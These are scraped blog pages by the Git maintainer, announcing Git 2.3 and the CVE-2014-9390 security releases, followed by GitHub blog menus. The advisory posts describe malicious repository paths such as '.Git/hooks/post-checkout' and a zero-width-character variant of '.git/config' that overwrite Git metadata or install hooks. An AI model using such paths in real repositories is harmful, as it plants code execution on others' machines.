This one ended up to be a release with lots of small corrections and improvements without big uncomfortably exciting features. It is a lot smaller release than other recent feature releases, consisting of 255 non-merge commits (version 2.0, 2.1 and 2.2 had 475, 698 and 556 commits, respectively) by 61 contributors (among which 19 are new people—welcome!).

The recent [security fix](http://git-blame.blogspot.com/2014/12/git-1856-195-205-214-and-221-and.html) that went to 2.2.1 and older maintenance tracks is also contained in this update.

One of my favorite small changes in this release is that the "Conflicts:" section that is prepared in the buffer to write your commit log message during a merge is now commented out, just like all the other hints to help you prepare the log message (e.g. the list of files with changes you might want to mention in the log, and the list of untracked files you might have forgot to "git add"). For the full text of the release notes, please visit [the list archive](http://permalink.gmane.org/gmane.comp.version-control.git/263411).

Enjoy.

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[2:54 PM](https://git-blame.blogspot.com/2015/02/git-23.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=7750163664896531636&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=7750163664896531636&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=7750163664896531636&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=7750163664896531636&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=7750163664896531636&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=7750163664896531636&target=pinterest "Share to Pinterest")

Labels:
[Announce](https://git-blame.blogspot.com/search/label/Announce),
[Git](https://git-blame.blogspot.com/search/label/Git)

[Newer Posts](https://git-blame.blogspot.com/search?updated-max=2015-07-27T14:18:00-07:00&max-results=10&reverse-paginate=true "Newer Posts")

[Older Posts](https://git-blame.blogspot.com/search?updated-max=2015-02-05T14:54:00-08:00&max-results=10 "Older Posts")

[Home](https://git-blame.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://git-blame.blogspot.com/feeds/posts/default)

## Pages

* [Home](https://git-blame.blogspot.com/)
* [A Note from the Maintainer](https://git-blame.blogspot.com/p/a-note-from-maintainer.html)
* [Git Presentation Slides](https://git-blame.blogspot.com/p/git-presentation-slides.html)
* [Git Public Repositories](https://git-blame.blogspot.com/p/git-public-repositories.html)
* [Leftover Bits](https://git-blame.blogspot.com/p/leftover-bits.html)

## Links

* [Preformatted Documentation Pages](http://git-scm.com/docs/git)
* [Gifts to Gitster](http://www.amazon.com/wishlist/1513KNZE30W63)
* [Git Calendar](http://tinyurl.com/gitcal)
* [(CLOSED) gitster's (old) blog](http://gitster.livejournal.com/)

## Blog Archive

* ►
  [2016](https://git-blame.blogspot.com/2016/)
  (1)
  + ►
    [May](https://git-blame.blogspot.com/2016/05/)
    (1)

* ▼
  [2015](https://git-blame.blogspot.com/2015/)
  (15)
  + ►
    [October](https://git-blame.blogspot.com/2015/10/)
    (1)
  + ►
    [July](https://git-blame.blogspot.com/2015/07/)
    (1)
  + ►
    [June](https://git-blame.blogspot.com/2015/06/)
    (3)
  + ►
    [May](https://git-blame.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://git-blame.blogspot.com/2015/04/)
    (2)
  + ►
    [March](https://git-blame.blogspot.com/2015/03/)
    (4)
  + ▼
    [February](https://git-blame.blogspot.com/2015/02/)
    (3)
    - [Nexus 4 still live and kicking](https://git-blame.blogspot.com/2015/02/nexus-4-still-live-and-kicking.html)
    - [Fun with "git diff -B -M"](https://git-blame.blogspot.com/2015/02/fun-with-git-diff-b-m.html)
    - [Git 2.3](https://git-blame.blogspot.com/2015/02/git-23.html)

* ►
  [2014](https://git-blame.blogspot.com/2014/)
  (6)
  + ►
    [December](https://git-blame.blogspot.com/2014/12/)
    (2)
  + ►
    [September](https://git-blame.blogspot.com/2014/09/)
    (1)
  + ►
    [May](https://git-blame.blogspot.com/2014/05/)
    (1)
  + ►
    [April](https://git-blame.blogspot.com/2014/04/)
    (1)
  + ►
    [March](https://git-blame.blogspot.com/2014/03/)
    (1)

* ►
  [2013](https://git-blame.blogspot.com/2013/)
  (36)
  + ►
    [November](https://git-blame.blogspot.com/2013/11/)
    (3)
  + ►
    [October](https://git-blame.blogspot.com/2013/10/)
    (1)
  + ►
    [September](https://git-blame.blogspot.com/2013/09/)
    (1)
  + ►
    [August](https://git-blame.blogspot.com/2013/08/)
    (3)
  + ►
    [July](https://git-blame.blogspot.com/2013/07/)
    (3)
  + ►
    [June](https://git-blame.blogspot.com/2013/06/)
    (5)
  + ►
    [May](https://git-blame.blogspot.com/2013/05/)
    (2)
  + ►
    [April](https://git-blame.blogspot.com/2013/04/)
    (1)
  + ►
    [March](https://git-blame.blogspot.com/2013/03/)
    (8)
  + ►
    [February](https://git-blame.blogspot.com/2013/02/)
    (7)
  + ►
    [January](https://git-blame.blogspot.com/2013/01/)
    (2)

* ►
  [2012](https://git-blame.blogspot.com/2012/)
  (58)
  + ►
    [December](https://git-blame.blogspot.com/2012/12/)
    (4)
  + ►
    [November](https://git-blame.blogspot.com/2012/11/)
    (2)
  + ►
    [October](https://git-blame.blogspot.com/2012/10/)
    (6)
  + ►
    [September](https://git-blame.blogspot.com/2012/09/)
    (3)
  + ►
    [August](https://git-blame.blogspot.com/2012/08/)
    (5)
  + ►
    [July](https://git-blame.blogspot.com/2012/07/)
    (5)
  + ►
    [June](https://git-blame.blogspot.com/2012/06/)
    (2)
  + ►
    [May](https://git-blame.blogspot.com/2012/05/)
    (2)
  + ►
    [April](https://git-blame.blogspot.com/2012/04/)
    (5)
  + ►
    [March](https://git-blame.blogspot.com/2012/03/)
    (10)
  + ►
    [February](https://git-blame.blogspot.com/2012/02/)
    (6)
  + ►
    [January](https://git-blame.blogspot.com/2012/01/)
    (8)

* ►
  [2011](https://git-blame.blogspot.com/2011/)
  (109)
  + ►
    [December](https://git-blame.blogspot.com/2011/12/)
    (8)
  + ►
    [November](https://git-blame.blogspot.com/2011/11/)
    (12)
  + ►
    [October](https://git-blame.blogspot.com/2011/10/)
    (5)
  + ►
    [September](https://git-blame.blogspot.com/2011/09/)
    (7)
  + ►
    [August](https://git-blame.blogspot.com/2011/08/)
    (3)
  + ►
    [July](https://git-blame.blogspot.com/2011/07/)
    (3)
  + ►
    [June](https://git-blame.blogspot.com/2011/06/)
    (24)
  + ►
    [May](https://git-blame.blogspot.com/2011/05/)
    (40)
  + ►
    [April](https://git-blame.blogspot.com/2011/04/)
    (7)

## Followers

|  |  |
| --- | --- |

Simple theme. Powered by [Blogger](https://www.blogger.com).



=== Content from git-blame.blogspot.com_2e3594ec_20250126_074651.html ===


# [Git Blame](https://git-blame.blogspot.com/)

Junio C Hamano aka [Gitster](https://plus.google.com/108182106411180467879?rel=author)'s Blog

## Monday, December 22, 2014

### [On CVE-2014-9390 and Git 2.2.1](https://git-blame.blogspot.com/2014/12/on-cve-2014-9390-and-git-221.html)

Now the security-fix releases are behind us, let's briefly talk about the ramifications.

The recent Git/Hg vulnerability on case-insensitive or normalizing filesystems are serious for people who fetch and integrate (either pull or pull --rebase) from untrusted sources.

When you grab a tree that records a malicious path, say, ".Git/hooks/post-checkout" using an older version of Git on such a filesystem (e.g. Windows NTFS or Mac OS X HFS+), Git will tell the filesystem to check it out at ".Git/hooks/post-checkout", but the filesystem overwrites a file different from what Git asked it to write, namely ".git/hooks/post-checkout", which is a path reserved for you to store an executable hook that is run after running "git checkout".

For an attacker to victimize you through this vector, the attacker has to have a write access to a repository you pull from. As long as you do not interact with untrustworthy strangers (e.g. only pull from the projects' official history), you will not be affected. That is often true in corporate setting, where the access to the central repository everybody in the product group uses is tightly controlled, and if an untrustworthy stranger has a write access there, you already have a bigger problem.

But the open-source is all about collaboration, and we need to meet and interact with new people every day while doing so. The prudent thing to do is to (1) update to the version of Git recently released to work around this issue, and then (2) respond to a pull request from a stranger, in this order. Don't do it the other way around!

Thanks.

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[11:51 AM](https://git-blame.blogspot.com/2014/12/on-cve-2014-9390-and-git-221.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=3948751872058303537&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=pinterest "Share to Pinterest")

Labels:
[Git](https://git-blame.blogspot.com/search/label/Git)

## Thursday, December 18, 2014

### [Git 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1 and thanking friends in Mercurial land](https://git-blame.blogspot.com/2014/12/git-1856-195-205-214-and-221-and.html)

We have a set of urgent maintenance releases. Please update your Git if you are on Windows or Mac OS X.

Git maintains various meta-information for its repository in files in .git/ directory located at the root of the working tree. The system does not allow a file in that directory (e.g. .git/config) to be committed in the history of the project, or checked out to the working tree from the project. Otherwise, an unsuspecting user can run git pull from an innocuous-looking-but-malicious repository and have the meta-information in her repository overwritten, or executable hooks installed by the owner of that repository she pulled from (i.e. an attacker).

Unfortunately, this protection has been found to be inadequate on certain file systems:

* You can commit and checkout to .Git/*<anything>* (or any permutations of cases .[gG][iI][tT], except .git all in lowercase). But this will overwrite the corresponding .git/*<anything>* on case-insensitive file systems (e.g. Windows and Mac OS X).
* In addition, because HFS+ file system (Mac OS X) considers certain Unicode codepoints as ignorable; committing e.g. .g\u200cit/config, where U+200C is such an ignorable codepoint, and checking it out on HFS+ would overwrite .git/config because of this.

The issue is shared with other version control systems and has serious impact on affected systems (CVE-2014-9390).

Credit for discovering this issue goes to our friends in the [Mercurial](http://mercurial.selenic.com/wiki/WhatsNew#Mercurial_3.2.3_.282014-12-18.29) land (most notably, the inventor of Hg, Matt Mackall himself). The fixes to this issue for various implementations of Git (including mine, libgit2, JGit), ports using these implementations (including Git for Windows, [Visual Studio](http://blogs.msdn.com/b/bharry/archive/2014/12/18/git-vulnerability-with-git-config.aspx)) and also Mercurial have been coordinated for simultaneous releases. GitHub is running an updated version of their software that rejects trees with these confusing and problematic paths, in order to protect its users who use existing versions of Git (also see [their blog post](https://github.com/blog/1938-vulnerability-announced-update-your-git-clients)).

A huge thanks to all those who were involved.

New releases of Git for Windows, Git OSx Installer, JGit and libgit2 have been prepared to fix this issue. Microsoft (which uses libgit2 in their Visual Studio products) and Apple (which distributes a port of Git in their Xcode) both have fixes, as well.

For people building from the source, fixed versions of Git have been released as versions v1.8.5.6, v1.9.5, v2.0.5, v2.1.4, and v2.2.1 for various maintenance tracks.

Thanks.

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[1:20 PM](https://git-blame.blogspot.com/2014/12/git-1856-195-205-214-and-221-and.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=4697381852008372260&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=pinterest "Share to Pinterest")

Labels:
[Announce](https://git-blame.blogspot.com/search/label/Announce),
[Git](https://git-blame.blogspot.com/search/label/Git)

[Newer Posts](https://git-blame.blogspot.com/search?updated-max=2015-06-25T13:12:00-07:00&max-results=10&reverse-paginate=true "Newer Posts")

[Older Posts](https://git-blame.blogspot.com/search?updated-max=2014-12-18T13:20:00-08:00&max-results=10 "Older Posts")

[Home](https://git-blame.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://git-blame.blogspot.com/feeds/posts/default)

## Pages

* [Home](https://git-blame.blogspot.com/)
* [A Note from the Maintainer](https://git-blame.blogspot.com/p/a-note-from-maintainer.html)
* [Git Presentation Slides](https://git-blame.blogspot.com/p/git-presentation-slides.html)
* [Git Public Repositories](https://git-blame.blogspot.com/p/git-public-repositories.html)
* [Leftover Bits](https://git-blame.blogspot.com/p/leftover-bits.html)

## Links

* [Preformatted Documentation Pages](http://git-scm.com/docs/git)
* [Gifts to Gitster](http://www.amazon.com/wishlist/1513KNZE30W63)
* [Git Calendar](http://tinyurl.com/gitcal)
* [(CLOSED) gitster's (old) blog](http://gitster.livejournal.com/)

## Blog Archive

* ►
  [2016](https://git-blame.blogspot.com/2016/)
  (1)
  + ►
    [May](https://git-blame.blogspot.com/2016/05/)
    (1)

* ►
  [2015](https://git-blame.blogspot.com/2015/)
  (15)
  + ►
    [October](https://git-blame.blogspot.com/2015/10/)
    (1)
  + ►
    [July](https://git-blame.blogspot.com/2015/07/)
    (1)
  + ►
    [June](https://git-blame.blogspot.com/2015/06/)
    (3)
  + ►
    [May](https://git-blame.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://git-blame.blogspot.com/2015/04/)
    (2)
  + ►
    [March](https://git-blame.blogspot.com/2015/03/)
    (4)
  + ►
    [February](https://git-blame.blogspot.com/2015/02/)
    (3)

* ▼
  [2014](https://git-blame.blogspot.com/2014/)
  (6)
  + ▼
    [December](https://git-blame.blogspot.com/2014/12/)
    (2)
    - [On CVE-2014-9390 and Git 2.2.1](https://git-blame.blogspot.com/2014/12/on-cve-2014-9390-and-git-221.html)
    - [Git 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1 and tha...](https://git-blame.blogspot.com/2014/12/git-1856-195-205-214-and-221-and.html)
  + ►
    [September](https://git-blame.blogspot.com/2014/09/)
    (1)
  + ►
    [May](https://git-blame.blogspot.com/2014/05/)
    (1)
  + ►
    [April](https://git-blame.blogspot.com/2014/04/)
    (1)
  + ►
    [March](https://git-blame.blogspot.com/2014/03/)
    (1)

* ►
  [2013](https://git-blame.blogspot.com/2013/)
  (36)
  + ►
    [November](https://git-blame.blogspot.com/2013/11/)
    (3)
  + ►
    [October](https://git-blame.blogspot.com/2013/10/)
    (1)
  + ►
    [September](https://git-blame.blogspot.com/2013/09/)
    (1)
  + ►
    [August](https://git-blame.blogspot.com/2013/08/)
    (3)
  + ►
    [July](https://git-blame.blogspot.com/2013/07/)
    (3)
  + ►
    [June](https://git-blame.blogspot.com/2013/06/)
    (5)
  + ►
    [May](https://git-blame.blogspot.com/2013/05/)
    (2)
  + ►
    [April](https://git-blame.blogspot.com/2013/04/)
    (1)
  + ►
    [March](https://git-blame.blogspot.com/2013/03/)
    (8)
  + ►
    [February](https://git-blame.blogspot.com/2013/02/)
    (7)
  + ►
    [January](https://git-blame.blogspot.com/2013/01/)
    (2)

* ►
  [2012](https://git-blame.blogspot.com/2012/)
  (58)
  + ►
    [December](https://git-blame.blogspot.com/2012/12/)
    (4)
  + ►
    [November](https://git-blame.blogspot.com/2012/11/)
    (2)
  + ►
    [October](https://git-blame.blogspot.com/2012/10/)
    (6)
  + ►
    [September](https://git-blame.blogspot.com/2012/09/)
    (3)
  + ►
    [August](https://git-blame.blogspot.com/2012/08/)
    (5)
  + ►
    [July](https://git-blame.blogspot.com/2012/07/)
    (5)
  + ►
    [June](https://git-blame.blogspot.com/2012/06/)
    (2)
  + ►
    [May](https://git-blame.blogspot.com/2012/05/)
    (2)
  + ►
    [April](https://git-blame.blogspot.com/2012/04/)
    (5)
  + ►
    [March](https://git-blame.blogspot.com/2012/03/)
    (10)
  + ►
    [February](https://git-blame.blogspot.com/2012/02/)
    (6)
  + ►
    [January](https://git-blame.blogspot.com/2012/01/)
    (8)

* ►
  [2011](https://git-blame.blogspot.com/2011/)
  (109)
  + ►
    [December](https://git-blame.blogspot.com/2011/12/)
    (8)
  + ►
    [November](https://git-blame.blogspot.com/2011/11/)
    (12)
  + ►
    [October](https://git-blame.blogspot.com/2011/10/)
    (5)
  + ►
    [September](https://git-blame.blogspot.com/2011/09/)
    (7)
  + ►
    [August](https://git-blame.blogspot.com/2011/08/)
    (3)
  + ►
    [July](https://git-blame.blogspot.com/2011/07/)
    (3)
  + ►
    [June](https://git-blame.blogspot.com/2011/06/)
    (24)
  + ►
    [May](https://git-blame.blogspot.com/2011/05/)
    (40)
  + ►
    [April](https://git-blame.blogspot.com/2011/04/)
    (7)

## Followers

|  |  |
| --- | --- |

Simple theme. Powered by [Blogger](https://www.blogger.com).



=== Content from github.com_bcb2609d_20250125_092518.html ===

[Skip to content](#start-of-content)
[Skip to sidebar](#sidebar)

/
[Blog](https://github.blog/)

* [Changelog](https://github.blog/changelog/)
* [Docs](https://docs.github.com/)
* [Customer stories](https://github.com/customer-stories)

[Use Copilot for free](https://github.com/features/copilot?utm_source=topnav&utm_medium=blog&utm_campaign=copilotfree)
[Contact sales](https://github.com/enterprise/contact?ref_cta=contact20sales&ref_loc=banner&ref_page=blog)

* [AI & ML](https://github.blog/ai-and-ml/)
  + [AI & ML](https://github.blog/ai-and-ml/)

    Learn about artificial intelligence and machine learning across the GitHub ecosystem and the wider industry.

    - [Generative AI](https://github.blog/ai-and-ml/generative-ai/)

      Learn how to build with generative AI.
    - [GitHub Copilot](https://github.blog/ai-and-ml/github-copilot/)

      Change how you work with GitHub Copilot.
    - [LLMs](https://github.blog/ai-and-ml/llms/)

      Everything developers need to know about LLMs.
    - [Machine learning](https://github.blog/ai-and-ml/machine-learning/)

      Machine learning tips, tricks, and best practices.
  + ![](https://github.blog/wp-content/uploads/2024/06/AI-DarkMode-4.png?resize=800%2C425)[How AI code generation works](https://github.blog/ai-and-ml/generative-ai/how-ai-code-generation-works/)

    Explore the capabilities and benefits of AI code generation and how it can improve your developer experience.

    Learn more
* [Developer skills](https://github.blog/developer-skills/)
  + [Developer skills](https://github.blog/developer-skills/)

    Resources for developers to grow in their skills and careers.

    - [Application development](https://github.blog/developer-skills/application-development/)

      Insights and best practices for building apps.
    - [Career growth](https://github.blog/developer-skills/career-growth/)

      Tips & tricks to grow as a professional developer.
    - [GitHub](https://github.blog/developer-skills/github/)

      Improve how you use GitHub at work.
    - [GitHub Education](https://github.blog/developer-skills/github-education/)

      Learn how to move into your first professional role.
    - [Programming languages & frameworks](https://github.blog/developer-skills/programming-languages-and-frameworks/)

      Stay current on what’s new (or new again).
  + ![](https://github.blog/wp-content/uploads/2024/05/Enterprise-DarkMode-3.png?resize=800%2C425)[Get started with GitHub documentation](https://docs.github.com/en/get-started)

    Learn how to start building, shipping, and maintaining software with GitHub.

    Learn more
* [Engineering](https://github.blog/engineering/)
  + [Engineering](https://github.blog/engineering/)

    Get an inside look at how we’re building the home for all developers.

    - [Architecture & optimization](https://github.blog/engineering/architecture-optimization/)

      Discover how we deliver a performant and highly available experience across the GitHub platform.
    - [Engineering principles](https://github.blog/engineering/engineering-principles/)

      Explore best practices for building software at scale with a majority remote team.
    - [Infrastructure](https://github.blog/engineering/infrastructure/)

      Get a glimpse at the technology underlying the world’s leading AI-powered developer platform.
    - [Platform security](https://github.blog/engineering/platform-security/)

      Learn how we build security into everything we do across the developer lifecycle.
    - [User experience](https://github.blog/engineering/user-experience/)

      Find out what goes into making GitHub the home for all developers.
  + ![](https://github.blog/wp-content/uploads/2024/07/Screenshot-2024-07-23-at-8.42.45 AM.png?resize=800%2C425)[How we use GitHub to be more productive, collaborative, and secure](https://github.blog/engineering/how-we-use-github-to-be-more-productive-collaborative-and-secure/)

    Our engineering and security teams do some incredible work. Let’s take a look at how we use GitHub to be more productive, build collaboratively, and shift security left.

    Learn more
* [Enterprise software](https://github.blog/enterprise-software/)
  + [Enterprise software](https://github.blog/enterprise-software/)

    Explore how to write, build, and deploy enterprise software at scale.

    - [Automation](https://github.blog/enterprise-software/automation/)

      Automating your way to faster and more secure ships.
    - [CI/CD](https://github.blog/enterprise-software/ci-cd/)

      Guides on continuous integration and delivery.
    - [Collaboration](https://github.blog/enterprise-software/collaboration/)

      Tips, tools, and tricks to improve developer collaboration.
    - [DevOps](https://github.blog/enterprise-software/devops/)

      DevOps resources for enterprise engineering teams.
    - [DevSecOps](https://github.blog/enterprise-software/devsecops/)

      How to integrate security into the SDLC.
    - [Governance & compliance](https://github.blog/enterprise-software/governance-and-compliance/)

      Ensuring your builds stay clean.
  + ![](https://github.blog/wp-content/uploads/2024/07/Screenshot-2024-07-23-at-8.43.47 AM.png?resize=800%2C425)[How enterprise engineering teams can successfully adopt AI](https://resources.github.com/artificial-intelligence/how-enterprise-engineering-teams-can-successfully-adopt-ai/)

    Learn how to bring AI to your engineering teams and maximize the value that you get from it.

    Learn more
* [News & insights](https://github.blog/news-insights/)
  + [News & insights](https://github.blog/news-insights/)

    Keep up with what’s new and notable from inside GitHub.

    - [Company news](https://github.blog/news-insights/company-news/)

      An inside look at news and product updates from GitHub.
    - [Product](https://github.blog/news-insights/product-news/)

      The latest on GitHub’s platform, products, and tools.
    - [Octoverse](https://github.blog/news-insights/octoverse/)

      Insights into the state of open source on GitHub.
    - [Policy](https://github.blog/news-insights/policy-news-and-insights/)

      The latest policy and regulatory changes in software.
    - [Research](https://github.blog/news-insights/research/)

      Data-driven insights around the developer ecosystem.
    - [The library](https://github.blog/news-insights/the-library/)

      Older news and updates from GitHub.
  + ![](https://github.blog/wp-content/uploads/2024/07/Screenshot-2024-07-23-at-8.44.23 AM.png?resize=800%2C425)[Unlocking the power of unstructured data with RAG](https://github.blog/ai-and-ml/llms/unlocking-the-power-of-unstructured-data-with-rag/)

    Learn how to use retrieval-augmented generation (RAG) to capture more insights.

    Learn more
* [Open Source](https://github.blog/open-source/)
  + [Open Source](https://github.blog/open-source/)

    Everything open source on GitHub.

    - [Git](https://github.blog/open-source/git/)

      The latest Git updates.
    - [Maintainers](https://github.blog/open-source/maintainers/)

      Spotlighting open source maintainers.
    - [Social impact](https://github.blog/open-source/social-impact/)

      How open source is driving positive change.
    - [Gaming](https://github.blog/open-source/gaming/)

      Explore open source games on GitHub.
  + ![](https://github.blog/wp-content/uploads/2024/07/Screenshot-2024-07-23-at-8.46.23 AM.png?resize=800%2C425)[An introduction to innersource](https://resources.github.com/software-development/innersource/)

    Organizations worldwide are incorporating open source methodologies into the way they build and ship their own software.

    Learn more
* [Security](https://github.blog/security/)
  + [Security](https://github.blog/security/)

    Stay up to date on everything security.

    - [Application security](https://github.blog/security/application-security/)

      Application security, explained.
    - [Supply chain security](https://github.blog/security/supply-chain-security/)

      Demystifying supply chain security.
    - [Vulnerability research](https://github.blog/security/vulnerability-research/)

      Updates from the GitHub Security Lab.
    - [Web application security](https://github.blog/security/web-application-security/)

      Helpful tips on securing web applications.
  + ![](https://github.blog/wp-content/uploads/2024/07/Screenshot-2024-07-23-at-8.47.04 AM.png?resize=800%2C425)[The enterprise guide to AI-powered DevSecOps](https://resources.github.com/security/the-enterprise-guide-to-ai-powered-devsecops/)

    Learn about core challenges in DevSecOps, and how you can start addressing them with AI and automation.

    Learn more

Search

## Categories

* [AI & ML](https://github.blog/ai-and-ml/)
  + Back[AI & ML](https://github.blog/ai-and-ml/)

    Learn about artificial intelligence and machine learning across the GitHub ecosystem and the wider industry.

    - [Generative AI](https://github.blog/ai-and-ml/generative-ai/)

      Learn how to build with generative AI.
    - [GitHub Copilot](https://github.blog/ai-and-ml/github-copilot/)

      Change how you work with GitHub Copilot.
    - [LLMs](https://github.blog/ai-and-ml/llms/)

      Everything developers need to know about LLMs.
    - [Machine learning](https://github.blog/ai-and-ml/machine-learning/)

      Machine learning tips, tricks, and best practices.
  + [How AI code generation works](https://github.blog/ai-and-ml/generative-ai/how-ai-code-generation-works/)

    Explore the capabilities and benefits of AI code generation and how it can improve your developer experience.

    [Learn more](https://github.blog/ai-and-ml/generative-ai/how-ai-code-generation-works/)
* [Developer skills](https://github.blog/developer-skills/)
  + Back[Developer skills](https://github.blog/developer-skills/)

    Resources for developers to grow in their skills and careers.

    - [Application development](https://github.blog/developer-skills/application-development/)

      Insights and best practices for building apps.
    - [Career growth](https://github.blog/developer-skills/career-growth/)

      Tips & tricks to grow as a professional developer.
    - [GitHub](https://github.blog/developer-skills/github/)

      Improve how you use GitHub at work.
    - [GitHub Education](https://github.blog/developer-skills/github-education/)

      Learn how to move into your first professional role.
    - [Programming languages & frameworks](https://github.blog/developer-skills/programming-languages-and-frameworks/)

      Stay current on what’s new (or new again).
  + [Get started with GitHub documentation](https://docs.github.com/en/get-started)

    Learn how to start building, shipping, and maintaining software with GitHub.

    [Learn more](https://docs.github.com/en/get-started)
* [Engineering](https://github.blog/engineering/)
  + Back[Engineering](https://github.blog/engineering/)

    Get an inside look at how we’re building the home for all developers.

    - [Architecture & optimization](https://github.blog/engineering/architecture-optimization/)

      Discover how we deliver a performant and highly available experience across the GitHub platform.
    - [Engineering principles](https://github.blog/engineering/engineering-principles/)

      Explore best practices for building software at scale with a majority remote team.
    - [Infrastructure](https://github.blog/engineering/infrastructure/)

      Get a glimpse at the technology underlying the world’s leading AI-powered developer platform.
    - [Platform security](https://github.blog/engineering/platform-security/)

      Learn how we build security into everything we do across the developer lifecycle.
    - [User experience](https://github.blog/engineering/user-experience/)

      Find out what goes into making GitHub the home for all developers.
  + [How we use GitHub to be more productive, collaborative, and secure](https://github.blog/engineering/how-we-use-github-to-be-more-productive-collaborative-and-secure/)

    Our engineering and security teams do some incredible work. Let’s take a look at how we use GitHub to be more productive, build collaboratively, and shift security left.

    [Learn more](https://github.blog/engineering/how-we-use-github-to-be-more-productive-collaborative-and-secure/)
* [Enterprise software](https://github.blog/enterprise-software/)
  + Back[Enterprise software](https://github.blog/enterprise-software/)

    Explore how to write, build, and deploy enterprise software at scale.

    - [Automation](https://github.blog/enterprise-software/automation/)

      Automating your way to faster and more secure ships.
    - [CI/CD](https://github.blog/enterprise-software/ci-cd/)

      Guides on continuous integration and delivery.
    - [Collaboration](https://github.blog/enterprise-software/collaboration/)

      Tips, tools, and tricks to improve developer collaboration.
    - [DevOps](https://github.blog/enterprise-software/devops/)

      DevOps resources for enterprise engineering teams.
    - [DevSecOps](https://github.blog/enterprise-software/devsecops/)

      How to integrate security into the SDLC.
    - [Governance & compliance](https://github.blog/enterprise-software/governance-and-compliance/)

      Ensuring your builds stay clean.
  + [How enterprise engineering teams can successfully adopt AI](https://resources.github.com/artificial-intelligence/how-enterprise-engineering-teams-can-successfully-adopt-ai/)

    Learn how to bring AI to your engineering teams and maximize the value that you get from it.

    [Learn more](https://resources.github.com/artificial-intelligence/how-enterprise-engineering-teams-can-successfully-adopt-ai/)
* [News & insights](https://github.blog/news-insights/)
  + Back[News & insights](https://github.blog/news-insights/)

    Keep up with what’s new and notable from inside GitHub.

    - [Company news](https://github.blog/news-insights/company-news/)

      An inside look at news and product updates from GitHub.
    - [Product](https://github.blog/news-insights/product-news/)

      The latest on GitHub’s platform, products, and tools.
    - [Octoverse](https://github.blog/news-insights/octoverse/)

      Insights into the state of open source on GitHub.
    - [Policy](https://github.blog/news-insights/policy-news-and-insights/)

      The latest policy and regulatory changes in software.
    - [Research](https://github.blog/news-insights/research/)

      Data-driven insights around the developer ecosystem.
    - [The library](https://github.blog/news-insights/the-library/)

      Older news and updates from GitHub.
  + [Unlocking the power of unstructured data with RAG](https://github.blog/ai-and-ml/llms/unlocking-the-power-of-unstructured-data-with-rag/)

    Learn how to use retrieval-augmented generation (RAG) to capture more insights.

    [Learn more](https://github.blog/ai-and-ml/llms/unlocking-the-power-of-unstructured-data-with-rag/)
* [Open Source](https://github.blog/open-source/)
  + Back[Open Source](https://github.blog/open-source/)

    Everything open source on GitHub.

    - [Git](https://github.blog/open-source/git/)

      The latest Git updates.
    - [Maintainers](https://github.blog/open-source/maintainers/)

      Spotlighting open source maintainers.
    - [Social impact](https://github.blog/open-source/social-impact/)

      How open source is driving positive change.
    - [Gaming](https://github.blog/open-source/gaming/)

      Explore open source games on GitHub.
  + [An introduction to innersource](https://resources.github.com/software-development/innersource/)

    Organizations worldwide are incorporating open source methodologies into the way they build and ship their own software.

    [Learn more](https://resources.github.com/software-development/innersource/)
* [Security](https://github.blog/security/)
  + Back[Security](https://github.blog/security/)

    Stay up to date on everything security.

    - [Application security](https://github.blog/security/application-security/)

      Application security, explained.
    - [Supply chain security](https://github.blog/security/supply-chain-security/)

      Demystifying supply chain security.
    - [Vulnerability research](https://github.blog/security/vulnerability-research/)

      Updates from the GitHub Security Lab.
    - [Web application security](https://github.blog/security/web-application-security/)

      Helpful tips on securing web applications.
  + [The enterprise guide to AI-powered DevSecOps](https://resources.github.com/security/the-enterprise-guide-to-ai-powered-devsecops/)

    Learn about core challenges in DevSecOps, and how you can start addressing them with AI and automation.

    [Learn more](https://resources.github.com/security/the-enterprise-guide-to-ai-powered-devsecops/)

* [Changelog](https://github.blog/changelog/)
* [Docs](https://docs.github.com/)
* [Customer stories](https://github.com/customer-stories)

[Contact sales](https://github.com/enterprise/contact?ref_cta=contact20sales&ref_loc=banner&ref_page=blog)
[Use Copilot for free](https://github.com/features/copilot?utm_source=topnav&utm_medium=blog&utm_campaign=copilotfree)

